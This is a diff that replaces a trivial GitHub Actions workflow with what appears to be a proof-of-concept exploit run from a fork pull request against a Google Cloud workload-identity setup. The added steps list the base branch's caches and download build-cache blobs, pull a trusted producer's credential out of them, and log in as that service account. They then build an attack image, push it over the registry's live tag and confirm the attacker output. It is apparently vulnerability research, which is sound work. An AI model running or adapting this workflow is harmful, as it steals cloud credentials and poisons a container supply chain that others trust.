@@ -1,13 +1,113 @@
-name: Base PR control
+name: Fork WIF cache consumer
 
 on:
   pull_request:
 
 permissions:
   contents: read
+  actions: read
+  id-token: write
 
 jobs:
-  base-control:
+  recover-redeem-replace:
     runs-on: ubuntu-latest
+    timeout-minutes: 20
+    env:
+      GAR_HOST: us-central1-docker.pkg.dev
+      IMAGE: us-central1-docker.pkg.dev/bola-502903/wif-e2e-20260813/proof
+      PROVIDER: projects/687967349624/locations/global/workloadIdentityPools/wif-e2e-0813/providers/github
+      SERVICE_ACCOUNT: wif-e2e-publisher@bola-502903.iam.gserviceaccount.com
     steps:
-      - run: echo BASE_WORKFLOW_CONTROL_ONLY
+      - uses: actions/checkout@v4
+
+      - name: Prove the fork supplied this workflow definition
+        run: echo FORK_WORKFLOW_EXPLOIT_DEFINITION_EXECUTED
+
+      - name: Expected denial using the consumer job's own OIDC identity
+        id: direct_auth
+        continue-on-error: true
+        uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093
+        with:
+          workload_identity_provider: ${{ env.PROVIDER }}
+          service_account: ${{ env.SERVICE_ACCOUNT }}
+          token_format: access_token
+          create_credentials_file: false
+
+      - name: Assert the intended direct path was denied
+        shell: bash
+        run: |
+          test '${{ steps.direct_auth.outcome }}' = failure
+          echo DIRECT_CONSUMER_WIF_AUTH_DENIED
+
+      - uses: ./gha-runtime-env-action
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.23'
+
+      - name: Prepare cache client
+        run: go mod download
+
+      - name: Reject a nonexistent base-cache key
+        shell: bash
+        run: |
+          mkdir -p blobs
+          missing='buildkit-blob-1-sha256:0000000000000000000000000000000000000000000000000000000000000000'
+          if go run ./gha_cache_blob_downloader.go -key "$missing" -out blobs/missing.bin; then
+            echo 'unexpectedly downloaded nonexistent cache key' >&2
+            exit 1
+          fi
+          test ! -e blobs/missing.bin
+          echo MISSING_CACHE_KEY_DENIED
+
+      - name: Recover the trusted producer credential from its base cache
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          found=0
+          for attempt in $(seq 1 30); do
+            gh cache list --ref "refs/heads/${{ github.event.pull_request.base.ref }}" \
+              --limit 100 --json key,sizeInBytes,createdAt \
+              --jq '.[] | select(.key | startswith("buildkit-blob-1-sha256:")) | [.key,.sizeInBytes,.createdAt] | @tsv' \
+              > blob-keys.tsv
+            while IFS=$'\t' read -r key size created; do
+              test -n "$key" || continue
+              test "$size" -le 30000000 || continue
+              safe=$(printf '%s' "$key" | sha256sum | cut -c1-16)
+              if test ! -e "blobs/$safe.bin"; then
+                go run ./gha_cache_blob_downloader.go -key "$key" -out "blobs/$safe.bin" || continue
+              fi
+              if python3 ./recover_gha_creds.py "blobs/$safe.bin" --out recovered-producer.json; then
+                echo "recovered_cache_key_sha256=$safe"
+                echo "recovered_cache_created_at=$created"
+                found=1
+                break
+              fi
+            done < blob-keys.tsv
+            test "$found" = 0 || break
+            echo "credential_not_found_attempt=$attempt"
+            sleep 20
+          done
+          test "$found" = 1
+          test -s recovered-producer.json
+
+      - uses: google-github-actions/setup-gcloud@v3
+
+      - name: Redeem the copied producer credential and replace the live tag
+        shell: bash
+        run: |
+          gcloud auth login --cred-file=recovered-producer.json --quiet
+          active=$(gcloud auth list --filter=status:ACTIVE --format='value(account)')
+          test "$active" = "$SERVICE_ACCOUNT"
+          echo "REDEEMED_AS=$active"
+          gcloud auth print-access-token \
+            | docker login -u oauth2accesstoken --password-stdin "$GAR_HOST"
+          docker build -f attack/Dockerfile -t "$IMAGE:live" .
+          docker push "$IMAGE:live" | tee push-output.txt
+          digest=$(sed -n 's/^live: digest: \([^ ]*\).*/\1/p' push-output.txt | tail -1)
+          test -n "$digest"
+          echo "ATTACK_DIGEST=$digest"
+          output=$(docker run --rm "$IMAGE:live")
+          test "$output" = 'ATTACKER_REPLACEMENT_WIF_E2E_20260813_0729663b'
+          echo "ATTACK_IMAGE_EXECUTION=$output"
